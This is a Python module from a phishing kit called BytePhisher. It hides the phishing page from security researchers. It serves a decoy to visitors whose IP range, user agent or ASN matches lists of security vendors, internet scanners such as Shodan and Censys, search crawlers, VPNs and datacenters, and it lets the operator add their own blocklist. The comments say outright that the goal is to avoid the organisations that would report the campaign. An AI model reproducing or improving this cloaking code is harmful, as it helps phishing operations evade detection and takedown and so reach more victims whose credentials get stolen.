"""Researcher / scanner filtering.

Every serious kit keeps a list of the networks and user agents that belong to
security vendors, cloud scanners and automated analysis services, and serves
them a decoy instead of the phishlet. The list here is explicit and editable:

  * organisations and ASNs  - cloud ranges, hosting, security vendors, VPNs
  * user-agent patterns     - crawlers and scanners that announce themselves
  * ip ranges               - the published ranges of the big internet-wide
                              scanners (Shodan, Censys, Google, Bing, ...)
  * data/blocklist.txt      - one entry per line, for a campaign's own list
                              (an organisation keyword, a UA substring, an IP
                              or a CIDR), so the operator can add targets
                              without touching code
"""
import ipaddress
import os

# --------------------------------------------------------------- organisations
# Cloud and hosting: a consumer login from a datacenter is analysis, not a
# victim. These match the ASN/organisation string a geo lookup returns.
DATACENTER_ORG = (
    "amazon", "aws", "google cloud", "google llc", "microsoft azure", "azure",
    "digitalocean", "linode", "akamai", "cloudflare", "fastly", "ovh", "hetzner",
    "leaseweb", "scaleway", "vultr", "choopa", "contabo", "ionos", "godaddy",
    "namecheap", "hostinger", "alibaba", "tencent", "huawei cloud", "oracle cloud",
    "ibm cloud", "rackspace", "equinix", "colocation", "datacenter", "data center",
    "server", "vps", "hosting", "colo", "cdn77", "stackpath", "upcloud", "hetzner online",
)

# Security vendors and the services that scan the web for a living: the same
# organisations that will report the campaign.
VENDOR_ORG = (
    "shodan", "censys", "binaryedge", "greynoise", "shadowserver", "netcraft",
    "palo alto", "fortinet", "fortiguard", "cisco", "checkpoint", "check point",
    "trend micro", "mcafee", "symantec", "kaspersky", "eset", "sophos", "avast",
    "bitdefender", "f-secure", "crowdstrike", "sentinelone", "mandiant",
    "recorded future", "riskIQ", "zscaler", "netskope", "proofpoint", "mimecast",
    "barracuda", "imperva", "f5 networks", "radware", "akamai technologies",
    "qualys", "rapid7", "tenable", "nessus", "sucuri", "wordfence", "siteLock",
    "urlscan", "phishtank", "apwg", "spamhaus", "abuse.ch", "netlab", "team cymru",
    "ironnet", "darktrace", "vectra", "extrahop", "gigamon", "netwitness",
    "security", "threat intel", "soc ", "cirt", "cert ", "csirt",
)

# Anonymising networks: a "victim" arriving over a commercial VPN or Tor is
# usually a researcher covering their tracks, never a consumer.
ANON_ORG = (
    "nordvpn", "expressvpn", "surfshark", "protonvpn", "proton ag", "cyberghost",
    "private internet access", "mullvad", "ipvanish", "hide.me", "windscribe",
    "torguard", "purevpn", "hotspot shield", "zenmate", "kaspersky secure",
    "tor exit", "tor-relay", "tor network", "tunnelbear", "vyprvpn",
)

# ---------------------------------------------------------------- user agents
SCANNER_UA = (
    "shodan", "censys", "binaryedge", "zgrab", "masscan", "nmap", "nuclei",
    "sqlmap", "nikto", "wpscan", "dirbuster", "gobuster", "ffuf", "feroxbuster",
    "httpx", "httprobe", "subfinder", "amass", "aquatone", "eyewitness",
    "w3af", "acunetix", "netsparker", "burpsuite", "burp collaborator", "zap",
    "owasp zap", "openvas", "qualys", "rapid7", "nessus", "tenable", "acunetix",
    "urlscan", "internetmeasurement", "internet-measurement", "netsystemsresearch",
    "palo alto networks", "expanse", "criminal ip", "onyphe", "leakix", "intelx",
    "spiderfoot", "maltego", "theharvester", "recon-ng", "sublist3r",
    "python-requests", "python-urllib", "aiohttp", "httpx/", "go-http-client",
    "okhttp", "libwww-perl", "wget/", "curl/", "java/", "apache-httpclient",
    "axios/", "node-fetch", "undici", "postmanruntime", "insomnia",
    "headlesschrome", "phantomjs", "slimerjs", "puppeteer", "playwright",
    "selenium", "htmlunit", "jsdom", "electron/", "crawler", "spider", "bot/",
    "scrapy", "wget", "check_http", "monitoring", "uptime", "pingdom",
    "statuscake", "site24x7", "datadog", "newrelic", "zabbix", "nagios",
    "semrush", "ahrefs", "moz.com", "screaming frog", "majestic", "similarweb",
    "archive.org_bot", "ia_archiver", "wayback", "commoncrawl", "ccbot",
    "facebookexternalhit", "telegrambot", "whatsapp", "slackbot", "discordbot",
)

# --------------------------------------------------------------- ip ranges
# Published ranges of the internet-wide scanners and the big crawlers. Kept
# small and explicit on purpose: a stale range list is worse than none.
# (range, whose it is) - the label goes into the log, so an operator can see
# why a visitor was refused instead of guessing from a bare CIDR
SCANNER_NETS = (
    ("66.240.192.0/18", "shodan"),
    ("71.6.128.0/19", "shodan"),
    ("71.6.134.0/23", "shodan"),
    ("71.6.146.0/23", "shodan"),
    ("71.6.158.0/23", "shodan"),
    ("71.6.165.0/24", "shodan"),
    ("71.6.194.0/23", "shodan"),
    ("71.6.199.0/24", "shodan"),
    ("71.6.216.0/21", "shodan"),
    ("71.6.226.0/23", "shodan"),
    ("80.82.64.0/19", "shodan"),
    ("82.221.96.0/20", "shodan"),
    ("89.248.160.0/19", "shodan"),
    ("93.120.27.0/24", "shodan"),
    ("104.131.0.0/16", "shodan"),
    ("104.236.0.0/16", "shodan"),
    ("107.150.32.0/19", "shodan"),
    ("128.199.0.0/16", "shodan"),
                ("178.62.0.0/16", "shodan"),
    ("185.181.100.0/22", "shodan"),
    ("188.138.0.0/16", "shodan"),
    ("198.20.69.0/24", "shodan"),
    ("198.20.70.0/23", "shodan"),
    ("198.20.87.0/24", "shodan"),
    ("198.20.99.0/24", "shodan"),
    ("199.87.228.0/22", "shodan"),
    ("206.168.34.0/23", "shodan"),
    ("209.126.0.0/16", "shodan"),
    ("216.117.2.0/24", "shodan"),
    # Censys
    ("162.142.125.0/24", "censys"), ("167.94.138.0/23", "censys"), ("167.248.133.0/24", "censys"),
    # Google / Bing crawlers: a login page visit from a crawler is not a victim
    ("66.249.64.0/19", "googlebot"), ("64.233.160.0/19", "googlebot"),
    ("72.14.192.0/18", "googlebot"), ("209.85.128.0/17", "googlebot"),
    ("40.77.167.0/24", "bingbot"), ("157.55.39.0/24", "bingbot"), ("207.46.13.0/24", "bingbot"),
    ("13.66.139.0/24", "bingbot"),
    # research scanners and abuse-monitoring networks
    ("45.33.0.0/16", "binaryedge"), ("216.75.0.0/16", "binaryedge"),
    ("184.105.139.0/24", "shadowserver"), ("184.105.143.0/24", "shadowserver"),
    ("184.105.247.0/24", "shadowserver"),
)


def _norm(s):
    return str(s or "").strip().lower()


def org_reason(org, isp="", asn=""):
    """Why this organisation is refused, or None."""
    hay = " ".join(_norm(x) for x in (org, isp, asn))
    if not hay.strip():
        return None
    for kw in VENDOR_ORG:
        if kw in hay:
            return f"security vendor / scanning service ({kw})"
    for kw in ANON_ORG:
        if kw in hay:
            return f"anonymising network ({kw})"
    for kw in DATACENTER_ORG:
        if kw in hay:
            return f"datacenter / hosting ({kw})"
    return None


def ua_reason(ua):
    u = _norm(ua)
    if not u:
        return "empty user agent"
    for kw in SCANNER_UA:
        if kw in u:
            return f"scanner / crawler user agent ({kw})"
    return None


def ip_reason(ip):
    try:
        addr = ipaddress.ip_address(str(ip).strip())
    except ValueError:
        return None
    for net, label in SCANNER_NETS:
        try:
            if addr in ipaddress.ip_network(net):
                return f"known scanning range ({label}, {net})"
        except ValueError:
            continue
    return None


# ------------------------------------------------------------- custom file
def load_file(path):
    """Read the operator's blocklist: one entry per line.

    Forms accepted (anything else is ignored, so a commented file is fine):
        vendor name          organisation keyword
        ua:python-requests   user-agent substring
        ip:203.0.113.9       exact address
        net:203.0.113.0/24   CIDR range
    """
    out = {"org": [], "ua": [], "ip": [], "net": []}
    if not path or not os.path.isfile(path):
        return out
    try:
        with open(path, encoding="utf-8", errors="replace") as f:
            lines = f.read().splitlines()
    except OSError:
        return out
    for raw in lines:
        line = raw.strip()
        if not line or line.startswith("#"):
            continue
        low = line.lower()
        if low.startswith("ua:"):
            out["ua"].append(line[3:].strip().lower())
        elif low.startswith("ip:"):
            out["ip"].append(line[3:].strip())
        elif low.startswith("net:"):
            out["net"].append(line[4:].strip())
        elif low.startswith("org:"):
            out["org"].append(line[4:].strip().lower())
        else:
            out["org"].append(low)
    return out


def custom_reason(entry, ip="", ua="", org="", isp="", asn=""):
    """Check the operator's own list; returns the reason or None."""
    if not entry:
        return None
    hay = " ".join(_norm(x) for x in (org, isp, asn))
    for kw in entry.get("org", ()):
        if kw and kw in hay:
            return f"blocklist organisation ({kw})"
    u = _norm(ua)
    for kw in entry.get("ua", ()):
        if kw and kw in u:
            return f"blocklist user agent ({kw})"
    if ip:
        if ip in entry.get("ip", ()):
            return f"blocklist address ({ip})"
        try:
            addr = ipaddress.ip_address(str(ip).strip())
        except ValueError:
            addr = None
        if addr is not None:
            for net in entry.get("net", ()):
                try:
                    if addr in ipaddress.ip_network(net):
                        return f"blocklist range ({net})"
                except ValueError:
                    continue
    return None


def screen(ip="", ua="", org="", isp="", asn="", entry=None):
    """Full screen for one visitor: (blocked, reason).

    Order matters only for the log: the operator's own list first, then the
    address ranges, then the user agent, then the organisation.
    """
    reason = custom_reason(entry, ip=ip, ua=ua, org=org, isp=isp, asn=asn)
    if reason:
        return True, reason
    reason = ip_reason(ip)
    if reason:
        return True, reason
    reason = ua_reason(ua)
    if reason:
        return True, reason
    reason = org_reason(org, isp, asn)
    if reason:
        return True, reason
    return False, ""


DEFAULT_FILE = os.path.join("data", "blocklist.txt")

SAMPLE_FILE = """# BytePhisher blocklist - one entry per line, '#' comments.
# Organisation keyword (matched against the ASN/org/ISP string):
#   some-vendor-name
# User-agent substring:
#   ua:some-scanner
# Exact address:
#   ip:203.0.113.9
# CIDR range:
#   net:203.0.113.0/24
"""
